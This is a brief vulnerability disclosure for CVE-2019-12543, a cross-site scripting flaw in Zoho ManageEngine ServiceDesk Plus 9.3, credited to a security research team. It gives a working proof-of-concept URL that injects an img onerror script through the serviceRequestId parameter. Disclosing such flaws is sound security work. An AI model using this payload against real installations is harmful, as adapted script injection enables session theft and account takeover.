# CVE-2019-12543 Zoho ManageEngine ServiceDesk Plus 9.3 XSS vulnerability in PurchaseRequest.do
Information Description: An issue was discovered in Zoho ManageEngine ServiceDesk Plus 9.3. There is XSS via the PurchaseRequest.do serviceRequestId parameter. 

**Author: Concobe of Tarantula Team - VinCSS (a member of Vingroup)**

# Payload 

domain/PurchaseRequest.do?operation=getAssociatedPrsForSR&serviceRequestId=1%3Cimg%20src%3da%20onerror%3dalert(%27XSS%27)%3E1
